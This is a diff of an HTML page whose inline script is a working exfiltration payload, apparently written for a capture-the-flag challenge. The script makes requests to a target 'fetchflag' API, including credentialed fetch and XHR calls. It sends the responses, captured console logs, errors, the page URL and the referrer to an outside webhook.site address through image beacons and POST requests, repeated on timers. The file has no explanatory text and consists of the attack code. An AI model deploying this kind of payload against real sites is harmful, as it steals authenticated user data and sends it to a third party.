@@ -2,95 +2,127 @@
 <html>
 <body>
 <script>
-// Track which methods work
-var results = [];
+// Override console methods to capture all logs
+var originalLog = console.log;
+var originalError = console.error;
+var capturedLogs = [];
 
-// Method 1: Simple Image Beacon (most reliable)
-try {
-    var img1 = new Image();
-    img1.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?method=image_beacon&time=' + Date.now();
-    results.push('image_beacon:attempted');
-} catch(e) {
-    results.push('image_beacon:failed-' + e.message);
-}
+console.log = function(...args) {
+    capturedLogs.push('LOG: ' + args.join(' '));
+    originalLog.apply(console, args);
+};
 
-// Method 2: Fetch to webhook
-try {
-    fetch('https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: 'fetch_post_works'
-    }).then(() => results.push('fetch_post:success')).catch(e => results.push('fetch_post:failed'));
-} catch(e) {
-    results.push('fetch_post:failed-' + e.message);
-}
+console.error = function(...args) {
+    capturedLogs.push('ERROR: ' + args.join(' '));
+    originalError.apply(console, args);
+};
 
-// Method 3: Navigate to webhook after delay
-setTimeout(() => {
+// Capture all errors
+window.onerror = function(msg, url, lineNo, columnNo, error) {
+    var errorStr = 'WINDOW ERROR: ' + msg + ' at ' + lineNo + ':' + columnNo;
+    capturedLogs.push(errorStr);
+    sendToWebhook('error', errorStr);
+    return false;
+};
+
+// Function to send data to webhook
+function sendToWebhook(type, data) {
+    var timestamp = Date.now();
     try {
-        window.location = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?method=navigation&time=' + Date.now();
+        var img = new Image();
+        img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?type=' + type + '&data=' + encodeURIComponent(data) + '&time=' + timestamp;
     } catch(e) {
-        // Ignore navigation errors
+        // Fallback if Image fails
+        try {
+            fetch('https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: type + ': ' + data
+            });
+        } catch(e2) {
+            // Last resort - nothing we can do
+        }
+    }
+}
+
+// Start capturing
+sendToWebhook('start', 'Page loaded at ' + new Date().toISOString());
+
+// TEST 1: Basic connectivity
+sendToWebhook('test1', 'Basic image beacon test');
+console.log('Test 1: Basic connectivity check');
+
+// TEST 2: Fetch to target API without credentials
+fetch('http://95.217.6.37:20001/api/fetchflag')
+.then(r => {
+    console.log('Fetch without credentials - Status:', r.status);
+    return r.text();
+})
+.then(txt => {
+    sendToWebhook('fetch_no_creds', 'Status: ' + txt.length + ' chars - ' + txt.substring(0, 200));
+})
+.catch(err => {
+    console.error('Fetch without credentials failed:', err);
+    sendToWebhook('fetch_no_creds_fail', err.toString());
+    
+    // TEST 3: Fetch to target API WITH credentials
+    fetch('http://95.217.6.37:20001/api/fetchflag', {
+        credentials: 'include'
+    })
+    .then(r => {
+        console.log('Fetch with credentials - Status:', r.status);
+        return r.text();
+    })
+    .then(txt => {
+        sendToWebhook('fetch_with_creds', 'Status: ' + txt.length + ' chars - ' + txt.substring(0, 200));
+    })
+    .catch(err2 => {
+        console.error('Fetch with credentials failed:', err2);
+        sendToWebhook('fetch_with_creds_fail', err2.toString());
+    });
+});
+
+// TEST 4: XMLHttpRequest
+try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://95.217.6.37:20001/api/fetchflag', true);
+    xhr.withCredentials = true;
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            console.log('XHR completed - Status:', xhr.status, 'Length:', xhr.responseText.length);
+            sendToWebhook('xhr_result', 'Status: ' + xhr.status + ' Length: ' + xhr.responseText.length);
+            if (xhr.status === 200) {
+                sendToWebhook('xhr_success', xhr.responseText.substring(0, 500));
+            }
+        }
+    };
+    xhr.onerror = function() {
+        console.error('XHR failed');
+        sendToWebhook('xhr_error', 'XHR request failed');
+    };
+    xhr.send();
+} catch(xhrError) {
+    console.error('XHR exception:', xhrError);
+    sendToWebhook('xhr_exception', xhrError.toString());
+}
+
+// TEST 5: Check if we're in an iframe or special context
+sendToWebhook('context', 'Window location: ' + window.location.href + ', Referrer: ' + document.referrer);
+
+// Final summary after 5 seconds
+setTimeout(() => {
+    var summary = 'CAPTURED LOGS:\n' + capturedLogs.join('\n');
+    sendToWebhook('final_summary', summary);
+    console.log('Final summary sent');
+}, 5000);
+
+// Keep trying to send logs every few seconds
+setInterval(() => {
+    if (capturedLogs.length > 0) {
+        var recentLogs = capturedLogs.join(' | ');
+        sendToWebhook('interval_logs', recentLogs);
     }
 }, 2000);
-
-// Method 4: Try to fetch the flag API
-setTimeout(() => {
-    try {
-        // Try without credentials first
-        fetch('http://95.217.6.37:20001/api/fetchflag')
-        .then(r => r.text())
-        .then(txt => {
-            var img = new Image();
-            img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?api_no_creds=' + encodeURIComponent(txt.substring(0, 50));
-        })
-        .catch(e => {
-            // Then try with credentials
-            fetch('http://95.217.6.37:20001/api/fetchflag', {credentials: 'include'})
-            .then(r => r.text())
-            .then(txt => {
-                var img = new Image();
-                img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?api_with_creds=' + encodeURIComponent(txt.substring(0, 50));
-            })
-            .catch(e2 => {
-                var img = new Image();
-                img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?api_both_failed=' + encodeURIComponent(e2.toString());
-            });
-        });
-    } catch(e) {
-        results.push('api_fetch:failed-' + e.message);
-    }
-}, 500);
-
-// Method 5: XMLHttpRequest as fallback
-setTimeout(() => {
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'http://95.217.6.37:20001/api/fetchflag', true);
-        xhr.withCredentials = true;
-        xhr.onload = function() {
-            var img = new Image();
-            img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?xhr_success=' + this.status;
-        };
-        xhr.onerror = function() {
-            var img = new Image();
-            img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?xhr_error=true';
-        };
-        xhr.send();
-    } catch(e) {
-        results.push('xhr:failed-' + e.message);
-    }
-}, 1000);
-
-// Final results beacon
-setTimeout(() => {
-    try {
-        var finalImg = new Image();
-        finalImg.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?final_results=' + encodeURIComponent(results.join(','));
-    } catch(e) {
-        // Ignore final errors
-    }
-}, 3000);
 </script>
 </body>
 </html>
